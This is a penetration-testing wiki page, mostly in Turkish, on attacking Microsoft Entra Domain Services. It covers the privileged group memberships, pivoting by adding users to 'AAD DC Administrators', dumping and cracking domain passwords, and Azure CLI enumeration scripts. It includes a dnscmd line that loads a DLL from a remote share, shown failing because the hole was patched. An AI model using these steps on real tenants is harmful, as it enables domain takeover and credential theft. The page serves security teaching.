# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## Domain Hizmetleri

Microsoft Entra Domain Services, Azure'da Domain Controller'ları yönetme gereği duymadan bir Active Directory dağıtmanıza olanak tanır (aslında onlara erişiminiz bile yoktur).

Ana amacı, modern kimlik doğrulama yöntemlerini kullanamayan veya dizin aramalarının her zaman on-premises bir AD DS ortamına geri dönmesini istemediğiniz legacy uygulamaları bulutta çalıştırabilmenizi sağlamaktır.

Note that in order to synchronize the users generated in Entra ID (and not synchronized from other active directories) to the AD domain service you need to **change the password of the user** to a new one so it can be synchronized with the new AD. Actually, the user isn't synchronized from Microsoft Entra ID to Domain Services until the password is changed.

> [!WARNING]
> Yeni bir active directory domain oluşturuyor olsanız bile onu tamamen yönetemeyeceğinizi unutmayın (bazı yanlış yapılandırmalar sömürülmedikçe); bu da varsayılan olarak örneğin AD içinde doğrudan kullanıcı oluşturamayacağınız anlamına gelir. Kullanıcıları **Entra ID'den senkronize ederek** oluşturursunuz. Tüm kullanıcıları (diğer on-premise AD'lerden senkronize edilenler dahil), sadece cloud kullanıcılarını (Entra ID'de oluşturulan kullanıcılar) veya hatta **daha fazla filtreleyerek** senkronize edecek şekilde belirleyebilirsiniz.

> [!NOTE]
> Genel olarak, yeni domain konfigürasyonundaki esneklik eksikliği ve AD'lerin genelde zaten on-premise olmasından dolayı, bu Entra ID ile AD arasındaki ana entegrasyon değildir; yine de nasıl ele geçirilebileceğini bilmek ilginçtir.

### Pivoting

Oluşturulan **`AAD DC Administrators`** grubunun üyelerine, yerel administrators grubuna eklendikleri için yönetilen domaine katılmış VM'lerde (ancak domain denetleyicilerinde değil) yerel yönetici izinleri verilir. Bu grubun üyeleri ayrıca **Remote Desktop kullanarak domaine katılmış VM'lere uzaktan bağlanabilirler** ve ayrıca şu grupların da üyeleridir:

- **`Denied RODC Password Replication Group`**: Bu grup, parolalarının RODC'lerde (Read-Only Domain Controllers) önbelleğe alınamayan kullanıcıları ve grupları belirtir.
- **`Group Policy Creators Owners`**: Bu grup, üyelerine domainde Group Policy oluşturmaya izin verir. Ancak üyeleri kullanıcı veya gruplara group policy uygulayamıyor ya da mevcut GPO'ları düzenleyemiyor, bu yüzden bu ortamda çok ilginç değil.
- **`DnsAdmins`**: Bu grup DNS ayarlarını yönetmeye izin verir ve geçmişte [escalate privileges and compromise the domain](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins) için suistimal edilmişti, ancak bu ortamdaki saldırı test edildikten sonra zafiyetin yamalandığı görüldü:
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Note that to grant these permissions, inside the AD the group **`AAD DC Administrators`** group is made a member of the previous groups, and also the GPO **`AADDC Computers GPO`** is adding as Local Administrators all the members of the domain group **`AAD DC Administrators`**.

Entra ID'den Domain Services ile oluşturulmuş bir AD'ye Pivoting yapmak basittir: bir kullanıcıyı **`AAD DC Administrators`** grubuna ekleyin, domaine ait herhangi/bütün makinelere RDP ile erişin; böylece veri çalabilir ve ayrıca **compromise the domain.**

Ancak domain'den Entra ID'ye pivoting yapmak o kadar kolay değildir çünkü domainden Entra ID'ye hiçbir şey senkronize edilmemektedir. Bununla birlikte, domain'e katılmış tüm VMs'in metadata'sını her zaman kontrol edin; atanan managed identities ilginç izinlere sahip olabilir. Ayrıca **dump all the users passwords from the domain** ve bunları crack etmeyi deneyip ardından Entra ID / Azure'a login olmaya çalışın.

> [!NOTE]
> Geçmişte bu managed AD'de DCs'i compromise etmeye izin veren başka zafiyetler bulundu, [like this one](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). DCs'i compromise eden bir saldırgan, Azure admins fark etmeden veya kaldırmalarına imkan vermeden kolayca persistence sağlayabilirdi.

### Keşif
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
